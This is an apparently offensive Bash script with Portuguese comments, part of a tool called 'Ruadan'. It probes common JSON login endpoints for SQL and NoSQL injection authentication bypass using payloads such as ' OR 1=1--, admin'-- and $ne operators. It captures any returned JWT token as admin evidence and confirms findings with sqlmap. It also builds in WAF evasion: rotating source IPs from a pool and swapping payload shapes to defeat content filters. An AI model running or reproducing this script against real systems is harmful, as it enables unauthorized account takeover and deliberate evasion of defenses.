#!/bin/bash
# ==============================================================================
# Ruadan - Probe de SQLi em endpoints de autenticação (login) com sqlmap
# ==============================================================================
# Uso: sqlmap_login_probe.sh <target> <port> <scheme>
#
# O QUE FAZ (por endpoint de login existente no alvo):
#   1. Probe rápido via curl: baseline (credencial inválida) vs bypass clássico
#      (' OR 1=1--) — bypass 200 onde baseline 401 = SQLi CONFIRMADA e o
#      token da resposta é registrado como evidência:
#        SQLI_LOGIN_BYPASS_CONFIRMED: <url>   → evidence_level=credential
#        JWT_ADMIN_CAPTURED: <url> (token N chars)
#   2. DEFESA ADAPTATIVA DE PAYLOAD (observado em campo, run 3): o bypass pode
#      levar 502/503 da camada do meio (proxy/WAF) enquanto a baseline passa —
#      o padrão SQLi foi ARMADO pela defesa depois de X usos. Conduta:
#        a. rotaciona identidade (IP do pool) e tenta de novo (até 3)
#        b. ainda 502 de IPs NOVOS → kill por CONTEÚDO, não por IP → tenta
#           VARIANTES de shape ('admin'--, NoSQL $ne, '||'1'='1) que dobram
#           pattern-matching ingênuo
#        c. tudo morto → WAF_CONTENT_KILL: <url> (intel p/ matriz: a defesa
#           aprende payloads)
#   3. Confirmação detalhada via sqlmap (parâmetro '*') apenas em endpoint vivo.
#
# EVASÃO: source da evasion_lib — requests com identidade do pool, rotação em
# bloqueio, jitter, budget. Um único request captura body+code (sem o bug do
# request duplo que queimava o dobro do threshold).
# ==============================================================================
set -u

TARGET="${1:?uso: sqlmap_login_probe.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 15"

# ---- camada de evasão (source + init; passa-through se enabled=0) -------------
_EV_LIB="$(dirname "${BASH_SOURCE[0]}")/evasion_lib.sh"
[ -f "$_EV_LIB" ] || _EV_LIB="/ruadan/evasion_lib.sh"
. "$_EV_LIB"
ev_init "$TARGET" "$PORT" "$SCHEME"
ev_should_abort && exit 0

# um request: body + code (o padrão antigo mandava 2x e queimava threshold)
_req() {  # $@ = curl args → $RESP_BODY, $RESP_CODE
    if [ "$EV_ENABLED" != 1 ]; then
        RESP_BODY=$(curl "$@" 2>/dev/null)
        RESP_CODE=$(curl "$@" -o /dev/null -w "%{http_code}" 2>/dev/null)
        return 0
    fi
    ev_body_and_code "$@"
    RESP_BODY="$EV_BODY"; RESP_CODE="$EV_CODE"
}

resolve_url() {
    local base="${SCHEME}://${TARGET}:${PORT}"
    if [ "$SCHEME" = "http" ]; then
        local redir
        redir=$(curl $CURL_OPTS ${EV__IDA[@]+"${EV__IDA[@]}"} -o /dev/null -w "%{redirect_url}" "${base}/" 2>/dev/null)
        if [ -n "$redir" ] && [[ "$redir" == https* ]]; then
            echo "[probe] ${base} redireciona para HTTPS — usando ${redir%/}" >&2
            echo "${redir%/}"
            return
        fi
    fi
    echo "$base"
}

BASE_URL="$(resolve_url)"
ev_set_probe_url "${BASE_URL}/"
echo "[probe] Alvo: ${BASE_URL}"

# tenta o bypass; em 502/503 (kill do meio) rotaciona identidade e repete.
# $1=endpoint $2=payload-JSON(com * p/ sqlmap) $3=field $4=bypass-JSON...
# retorna 0 se ALGUMA tentativa respondeu (qualquer código), 1 se nada
try_bypass() {  # $1=endpoint, $2..=payloads JSON de bypass
    local ep="$1"; shift
    local url="${BASE_URL}${ep}"
    local payload tries=0
    BYPASS_CODE=""; BYPASS_BODY=""
    for payload in "$@"; do
        tries=0
        while [ "$tries" -lt 3 ]; do
            _req $CURL_OPTS -X POST "$url" -H "Content-Type: application/json" -d "$payload"
            BYPASS_CODE="$RESP_CODE"; BYPASS_BODY="$RESP_BODY"
            case "$RESP_CODE" in
                502|503)
                    # kill da camada do meio: identidade nova e repete
                    tries=$((tries + 1))
                    if [ "$EV_ENABLED" = 1 ]; then
                        echo "[probe] WAF-kill (HTTP $RESP_CODE) no bypass — rotacionando identidade (tentativa $tries)"
                        ev_rotate
                        ev_set_probe_url "${BASE_URL}/"
                    else
                        break
                    fi
                    ;;
                *) return 0 ;;
            esac
        done
    done
    return 1
}

probe_login() {
    # $1 = endpoint, $2 = data-JSON (com '*' no parâmetro a testar), $3 = campo
    local ep="$1" data="$2" field="${3:-email}"
    local url="${BASE_URL}${ep}"

    # Existência do endpoint — se morrer (000/502/503) com identidade atual
    # (IP bloqueado ou WAF), rotaciona e tenta UMA vez com identidade nova
    local exist_try=0
    _req $CURL_OPTS -o /dev/null -X POST "$url" -H "Content-Type: application/json" -d "$data"
    while [ "$RESP_CODE" = "000" ] || [ "$RESP_CODE" = "502" ] || [ "$RESP_CODE" = "503" ]; do
        exist_try=$((exist_try + 1))
        [ "$exist_try" -gt 2 ] && return
        if [ "$EV_ENABLED" != 1 ]; then return; fi
        echo "[probe] Existência de ${ep} morta (HTTP ${RESP_CODE}) — rotacionando identidade"
        ev_rotate
        ev_set_probe_url "${BASE_URL}/"
        _req $CURL_OPTS -o /dev/null -X POST "$url" -H "Content-Type: application/json" -d "$data"
    done
    case "$RESP_CODE" in
        404|501|"") return ;;
    esac

    # Baseline: credencial claramente inválida
    _req $CURL_OPTS -X POST "$url" -H "Content-Type: application/json" \
        -d '{"email":"probe-nonexistent-9917@ruadan.local","password":"probe-WRONG-9917"}'
    local code_baseline="$RESP_CODE"

    # Bypass: clássico + variantes de shape (dobram WAF de padrão ingênuo)
    local CLASSIC="{\"$field\":\"' OR 1=1--\",\"password\":\"probe-WRONG-9917\"}"
    local V_COMMENT="{\"$field\":\"' or 1=1#\",\"password\":\"x\"}"
    local V_ADMIN="{\"$field\":\"admin'--\",\"password\":\"x\"}"
    local V_CONCAT="{\"$field\":\"'||'1'='1\",\"password\":\"x\"}"
    local V_NOSQL="{\"$field\":{\"\$ne\":null},\"password\":{\"\$ne\":null}}"
    try_bypass "$ep" "$CLASSIC" "$V_COMMENT" "$V_ADMIN" "$V_CONCAT" "$V_NOSQL"
    local code_bypass="$BYPASS_CODE" body_bypass="$BYPASS_BODY"

    echo "[probe] $ep → baseline=${code_baseline} bypass=${code_bypass}"

    if [ "$code_bypass" = "200" ] && [ "$code_baseline" != "200" ]; then
        echo "SQLI_LOGIN_BYPASS_CONFIRMED: ${url} (baseline HTTP ${code_baseline} vs bypass HTTP ${code_bypass})"
        # JWT/token na resposta = evidência de credencial imediata
        local tok
        tok=$(echo "$body_bypass" | grep -oE '"token":"[^"]+"' | head -1)
        if [ -n "$tok" ]; then
            echo "JWT_ADMIN_CAPTURED: ${url} (token ${#tok} chars)"
        fi
        echo "[probe] EVIDÊNCIA (resposta do bypass, primeiros 300 bytes):"
        echo "$body_bypass" | head -c 300
        echo ""
        echo "[probe] Confirmando via sqlmap (pode levar alguns minutos)..."
        timeout 600 sqlmap -u "$url" --method POST --data "$data" \
            -H "Content-Type: application/json" \
            --batch --level 2 --risk 1 --threads 5 --timeout 15 --retries 2 \
            --technique=BU --flush-session 2>&1 | grep -E "Parameter|Type:|Title:|Payload:|back-end|is vulnerable|not vulnerable" | head -20
        return
    fi

    if [ "$code_bypass" = "502" ] || [ "$code_bypass" = "503" ]; then
        # 502/503 em TODAS as identidades = kill por CONTEÚDO (WAF armado)
        echo "WAF_CONTENT_KILL: ${url} (bypass morto pela camada do meio: HTTP ${code_bypass} em identidades distintas, baseline ${code_baseline} passa) — defesa aprendeu o padrão do payload"
        return
    fi

    if [ "$code_bypass" != "$code_baseline" ]; then
        echo "[probe] Bypass manual não confirmou (diff ${code_baseline}→${code_bypass}) — sqlmap rápido para dupla verificação..."
        timeout 240 sqlmap -u "$url" --method POST --data "$data" \
            -H "Content-Type: application/json" \
            --batch --level 1 --risk 1 --threads 5 --timeout 10 --retries 1 \
            --flush-session 2>&1 | grep -E "Parameter|Type:|Title:|Payload:|is vulnerable|not vulnerable" | head -12
    else
        echo "[probe] Endpoint $ep sem diferença baseline/bypass (${code_baseline}/${code_bypass}) — sqlmap de verificação pulado (economia de tempo)."
    fi
}

# Endpoints de login comuns (JSON) — o '*' marca o parâmetro do sqlmap
probe_login "/rest/user/login"  '{"email":"*","password":"ruadan-probe"}' "email"
probe_login "/api/login"        '{"username":"*","password":"ruadan-probe"}' "username"
probe_login "/api/auth/login"   '{"email":"*","password":"ruadan-probe"}' "email"
probe_login "/auth/login"       '{"email":"*","password":"ruadan-probe"}' "email"

echo "[probe] Probe de SQLi em logins concluído."
exit 0
